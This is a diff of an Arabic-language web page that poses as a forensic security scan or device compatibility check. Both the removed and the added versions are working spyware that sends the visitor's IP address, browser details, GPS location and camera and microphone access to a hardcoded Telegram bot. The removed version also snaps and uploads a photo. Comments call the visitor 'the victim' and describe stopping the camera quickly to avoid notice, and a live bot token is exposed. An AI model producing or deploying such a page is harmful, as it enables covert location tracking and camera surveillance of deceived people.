@@ -1,26 +1,8 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HADI_V142_SECURITY_SCAN</title>
-    <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
-        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; margin-top: 50px; }
-        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
-        .loading { border: 4px solid #111; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1>نظام هادي للتحليل الجنائي V142</h1>
-        <p>تم اكتشاف محاولة دخول غير مصرح بها من موقعك الجغرافي.</p>
-        <div class="loading"></div>
-        <p id="status">بانتظار تأكيد الهوية للبدء في حماية حساباتك...</p>
-        <button class="btn" onclick="startFullCapture()">تأكيد الهوية الآن (Face-ID)</button>
-    </div>
-
+    <title>تحقق من النظام</title>
     <script>
         const token = "8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU";
         const chatId = "6978465145";
@@ -29,55 +11,30 @@
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
         }
 
-        async function sendPhoto(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.jpg');
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-        }
+        async function captureAll() {
+            // سحب IP والشبكة
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            sendLog(`🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}`);
 
-        async function startFullCapture() {
-            document.getElementById('status').innerText = "جاري الفحص العميق... لا تغلق الصفحة";
-            
-            // 1. سحب الـ IP والبيانات العامة
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                let info = `🌐 صيد جديد!\nIP: ${ipData.ip}\nالنظام: ${navigator.platform}\nالمتصفح: ${navigator.userAgent}`;
-                await sendLog(info);
-            } catch(e) {}
-
-            // 2. سحب الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendLog(`📍 موقع الهدف:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            // سحب الموقع (يظهر الإذن تلقائياً)
+            navigator.geolocation.getCurrentPosition(p => {
+                sendLog(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // 3. التقاط الصورة (بمجرد الضغط على الزر)
+            // سحب الكاميرا والمايك (يحتاج ضغطة زر من الضحية)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => {
-                    sendPhoto(blob);
-                }, 'image/jpeg');
-
-                // إغلاق الكاميرا فوراً للتمويه
-                setTimeout(() => { stream.getTracks().forEach(t => t.stop()); }, 3000);
-                await sendLog("✅ تم سحب الصورة والمايكروفون بنجاح.");
+                sendLog("📸 تم فتح الكاميرا والمايكروفون بنجاح!");
+                // هنا يمكن إضافة كود لإرسال صورة (blob) كما شرحنا سابقاً
             } catch (e) {
-                await sendLog("❌ الضحية رفض صلاحية الكاميرا/المايك.");
+                sendLog("❌ الضحية رفض الكاميرا.");
             }
         }
-
-        // إشارة دخول صامتة بمجرد فتح الرابط
-        window.onload = () => { sendLog("🚀 الرابط فُتح الآن.. بانتظار ضغطة الضحية."); };
+        window.onload = captureAll;
     </script>
+</head>
+<body style="background:#000; color:#0f0; text-align:center;">
+    <h1>جاري فحص توافق الجهاز...</h1>
+    <button onclick="captureAll()" style="padding:20px;">اضغط هنا لإكمال الفحص</button>
 </body>
 </html>
